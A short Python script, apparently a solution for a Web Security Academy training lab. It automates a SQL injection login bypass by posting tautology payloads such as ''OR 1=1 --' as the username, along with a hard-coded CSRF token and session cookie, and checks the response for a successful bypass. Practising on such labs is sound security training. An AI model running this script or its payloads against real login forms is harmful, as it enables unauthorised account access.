#SQL injection vulnerability allowing login bypass
#Login to website
#Just use the SQL injection to get authenticated and get logged in

import requests

url = "https://0a5e00c904b54c2bc056c7b6009f00ce.web-security-academy.net/login"

#data ====csrf=PKmWEPWbPJyUyVAcNncL1fwCP1pVYBzT&username=admin&password=admin

#Cookie: session=rstTxt3o5ObCIQU3VwNmVqQc9tF145jC

boolean_filter = [
    "'OR 1=1 --",
    "'OR '1'='1' #"
]
def sqli_login(url):
    for i in boolean_filter:
        data={
            "csrf":"PKmWEPWbPJyUyVAcNncL1fwCP1pVYBzT",
            "username":i,
            "password":"anything" # i.e It will be commented so password is not our concern
        }
        cookie={
            "session":"rstTxt3o5ObCIQU3VwNmVqQc9tF145jC"
        }
        r = requests.post(url,data=data,cookies=cookie)
        if "Invalid username" not in r.text:
            print("bypassed:{}".format(url+i))


sqli_login(url)